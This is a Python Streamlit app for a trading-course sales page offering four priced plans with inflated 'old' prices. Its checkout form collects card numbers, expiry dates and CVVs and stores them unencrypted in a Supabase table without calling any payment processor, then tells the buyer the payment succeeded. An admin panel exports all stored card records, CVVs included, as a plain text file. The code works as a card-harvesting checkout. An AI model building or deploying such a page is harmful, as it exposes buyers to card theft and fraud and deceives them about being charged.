import streamlit as st
from supabase import create_client, Client
import re
from dotenv import load_dotenv
import os

load_dotenv()

st.set_page_config(layout="wide")

# =============================================================================
# SUPABASE SETUP - REPLACE WITH YOUR CREDENTIALS
# =============================================================================
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception as e:
    st.error(f"Error connecting to Supabase: {e}")
    st.stop()

# =============================================================================
# CSS STYLES FOR THE ENTIRE APP, INCLUDING THE IMPROVED CHECKOUT PAGE
# =============================================================================
st.markdown("""
    <style>
    html, body, [data-testid="stAppViewContainer"] {
        background-color: #271142;
        color: white;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    .price-box {
        border: 2px solid white;
        border-radius: 10px;
        padding: 25px;
        margin: 10px;
        color: white;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        position: relative;
    }
    .plan-title {
        font-size: 26px;
        font-weight: bold;
        margin-bottom: 10px;
    }
    .plan-price {
        font-size: 24px;
        color: #8bd046;
        font-weight: bold;
    }
    .strike {
        text-decoration: line-through;
        color: #cccccc;
        font-size: 16px;
        margin-left: 8px;
    }
    .popular-badge {
        background-color: #8bd046;
        color: black;
        padding: 6px 12px;
        font-size: 14px;
        font-weight: bold;
        border-radius: 6px;
        display: inline-block;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        position: absolute;
        top: -15px;
        right: -15px;
        transform: rotate(5deg);
        z-index: 10;
    }
    ul {
        padding-left: 20px;
        font-size: 15px;
        list-style-type: none;
        flex-grow: 1;
        margin: 10px 0;
    }
    ul li::before {
        content: "✔ ";
        color: #8bd046;
        font-weight: bold;
    }

    /* =====================================================================
    * UPDATED BUTTON STYLES FOR ALL BUTTONS
    * ===================================================================== */
    [data-testid="stButton"] > button, 
    [data-testid="stForm"] [data-testid="stButton"] > button,
    [data-testid="stForm"] [data-testid="stFormSubmitButton"] > button {
        background-color: #8bd046;
        color: white !important;
        font-weight: bold;
        padding: 10px 25px;
        border-radius: 6px;
        border: none;
        font-size: 16px;
        cursor: pointer;
        width: 100%;
        margin-top: auto;
    }
    [data-testid="stButton"] > button:hover, 
    [data-testid="stForm"] [data-testid="stButton"] > button:hover,
    [data-testid="stForm"] [data-testid="stFormSubmitButton"] > button:hover {
        background-color: #72a33c; /* Slightly darker green on hover */
    }

    /* =====================================================================
    * IMPROVED CHECKOUT PAGE STYLES
    * ===================================================================== */
    .checkout-container {
        max-width: 500px;
        margin: 50px auto;
        padding: 30px;
        background-color: #3b1c60; /* Slightly lighter background for contrast */
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        border: 2px solid #8bd046;
    }
    .checkout-title {
        font-size: 2em;
        font-weight: bold;
        text-align: center;
        color: #8bd046;
        margin-bottom: 20px;
    }
    /* FIX: Make labels visible by setting their color to white */
    .stTextInput > label {
        color: green
    }
    .stTextInput > div > div > input {
        border-radius: 8px;
        border: 1px solid #5a5a5a;
        background-color: #271142;
        color: white;
        padding: 12px;
        font-size: 16px;
    }
    .stForm > div > div:last-child {
        margin-top: 20px;
    }
    .stForm > div > div > div:nth-child(2) { /* Targeting the buttons container */
        display: flex;
        justify-content: space-between;
        gap: 10px;
    }
    .card-icon {
        height: 20px;
        margin-left: 10px;
        vertical-align: middle;
    }
    .st-dg {
        background-color: #3b1c60;
        border: 2px solid #8bd046;
        border-radius: 15px;
        padding: 30px;
    }

    </style>
""", unsafe_allow_html=True)


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def save_payment_info(name, card, expiry, cvv, plan_title):
    try:
        # Check for empty data
        if not name or not card or not expiry or not cvv:
            st.error("All fields are required.")
            return False

        # Name length check
        if len(name) > 100:
            st.error("Name must not be too long.")
            return False

        # Card number validation
        card_number_clean = card.replace(" ", "")
        card_type = ""
        # Visa, Mastercard, AMEX and other popular card providers regex
        if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', card_number_clean):
            card_type = "VISA"
        elif re.match(r'^5[1-5][0-9]{14}$', card_number_clean):
            card_type = "MASTERCARD"
        elif re.match(r'^3[47][0-9]{13}$', card_number_clean):
            card_type = "AMEX"
        elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', card_number_clean):
            card_type = "JCB"
        elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', card_number_clean):
            card_type = "Discover"
        else:
            st.error("Invalid card number. Please enter a valid Visa, Mastercard, AMEX, or Discover card number.")
            return False

        # Expiry date validation
        if not re.match(r"^(0[1-9]|1[0-2])\/\d{2}$", expiry):
            st.error("Invalid expiry date. Use MM/YY format.")
            return False

        # CVV validation based on card type
        if card_type == "AMEX":
            if not re.match(r"^\d{4}$", cvv):
                st.error("Invalid CVV. AMEX cards require a 4-digit CVV.")
                return False
        else:
            if not re.match(r"^\d{3}$", cvv):
                st.error("Invalid CVV. Please enter a 3-digit CVV.")
                return False
        if int(cvv) <= 0:
            st.error("CVV must be greater than 0.")
            return False

        data = {
            "name": name,
            "card_number": card,
            "expiry": expiry,
            "cvv": cvv,
            "plan": plan_title
        }

        response = supabase.table("payment_page").insert(data).execute()

        if response.data:
            st.session_state.page = "success"
            st.rerun()
        else:
            st.error("Failed to save payment info. Please check your Supabase RLS policies and table schema.")
            return False

    except Exception as e:
        st.error(f"Failed to save payment info: {e}")
        return False


def go_home():
    st.session_state.page = "home"


# =============================================================================
# DIALOG DEFINITION
# =============================================================================
@st.dialog("Payment Details")
def checkout_dialog(plan_title):
    st.markdown(f"""
        <div class="text-white">
            <h2 class='checkout-title'>Payment for {plan_title} Plan</h2>
        </div>
    """, unsafe_allow_html=True)

    with st.form(key="payment_form", clear_on_submit=True):
        name = st.text_input("Name")
        card_number_input = st.text_input("Card #")

        card_number_clean = card_number_input.replace(" ", "")
        card_type = "Unknown"
        if card_number_clean.startswith('4'):
            card_type = "VISA"
        elif card_number_clean.startswith(('51', '52', '53', '54', '55')):
            card_type = "MASTERCARD"
        elif card_number_clean.startswith(('34', '37')):
            card_type = "AMEX"
        elif card_number_clean.startswith(('2131', '1800', '35')):
            card_type = "JCB"
        elif card_number_clean.startswith(('6011', '65')):
            card_type = "Discover"

        st.markdown(f'<div style="display: flex; align-items: center; color: white;">Card Type: {card_type}</div>',
                    unsafe_allow_html=True)

        col1, col2 = st.columns(2)
        with col1:
            expiry = st.text_input("Expiry (MM/YY)")
        with col2:
            cvv = st.text_input("CVV", type="password")

        submitted = st.form_submit_button("Submit Payment", use_container_width=True)

        if submitted:
            save_payment_info(name, card_number_input, expiry, cvv, plan_title)


# =============================================================================
# APP STATE AND LAYOUT
# =============================================================================
if "page" not in st.session_state:
    st.session_state.page = "home"
    st.session_state.selected_plan = None

plans = [
    {
        "title": "Beginners", "price": "€249", "old_price": "€329",
        "modules": "up to 3 Modules", "videos": "44 Videos", "popular": False,
    },
    {
        "title": "Intermediate", "price": "€499", "old_price": "€700",
        "modules": "up to 6 Modules", "videos": "72 Videos", "popular": False,
    },
    {
        "title": "Advanced", "price": "€999", "old_price": "€1500",
        "modules": "up to 9 Modules", "videos": "123 Videos", "popular": True,
    },
    {
        "title": "Premium", "price": "€2499", "old_price": "€4000",
        "modules": "up to 15 Modules", "videos": "123 Videos", "popular": False,
    },
]

features = [
    "Trading Essentials Course", "Technical Trading Course", "Strategic Trading Course",
    "eBooks", "3 High-Probability Trading Setups", "Economic Calendar",
    "Digital Currency Calendar", "Glossary", "Daily Market News",
    "Daily Market Research", "Trading Signals", "Market Scanners",
    "Currency Strength Meter", "Market Highlights TV", "Trend Analysis",
    "Access to live session with a dedicated trainer - {modules}", "{videos}",
    "Knowledge Checks", "Assignments", "Lifetime Access"
]

# --- MAIN APP LAYOUT ---
if st.session_state.page == "home":
    st.title("Choose Your Plan")
    cols = st.columns(4)
    for i, col in enumerate(cols):
        plan = plans[i]
        with col:
            box_html = '<div class="price-box">'
            if plan["popular"]:
                box_html += '<div class="popular-badge">Most Popular</div>'
            box_html += f'<div class="plan-title">{plan["title"]}</div>'
            box_html += f'<div class="plan-price">{plan["price"]}<span class="strike">{plan["old_price"]}</span></div>'
            list_html = "<ul>"
            for feat in features:
                line = feat.replace("{modules}", plan["modules"]).replace("{videos}", plan["videos"])
                list_html += f"<li>{line}</li>"
            list_html += "</ul>"
            box_html += list_html + '</div>'
            st.markdown(box_html, unsafe_allow_html=True)
            if st.button("Buy Package", key=f"buy_{plan['title']}", use_container_width=True):
                checkout_dialog(plan['title'])

# --- SUCCESS PAGE ---
elif st.session_state.page == "success":
    st.balloons()
    st.success("Payment Successful! Thank you for your purchase.")
    st.button("Go to Home", on_click=go_home)

# =============================================================================
# PASSWORD-PROTECTED CRM DATA DOWNLOAD
# =============================================================================

def download_crm_data():
    st.markdown("---")
    st.subheader("🔐 Admin: Download CRM Data")

    correct_password = os.getenv("CRM_DOWNLOAD_PASSWORD")

    if "download_authenticated" not in st.session_state:
        st.session_state.download_authenticated = False

    if not st.session_state.download_authenticated:
        entered_password = st.text_input("Enter admin password:", type="password")
        if entered_password == correct_password:
            st.session_state.download_authenticated = True
            st.success("Access granted.")
            if st.session_state.download_authenticated:
                    # After correct password, fetch data and display download button
                    try:
                        response = supabase.table("payment_page").select("*").execute()
                        if response.data:
                            lines = []
                            for row in response.data:
                                line = ", ".join(f"{k}: {v}" for k, v in row.items())
                                lines.append(line)
                            content = "\n".join(lines)

                            st.download_button(
                                label="📥 Click to Download CRM Data",
                                data=content.encode("utf-8"),
                                file_name="crm_payments.txt",
                                mime="text/plain"
                            )
                        else:
                            st.warning("No data found in the payment_page table.")
                    except Exception as e:
                        st.error(f"Error fetching data from Supabase: {e}")              
        elif entered_password:
            st.error("Incorrect password.")
        return

    


# Call the download feature at the bottom of the app (optional: only show to admin)
download_crm_data()
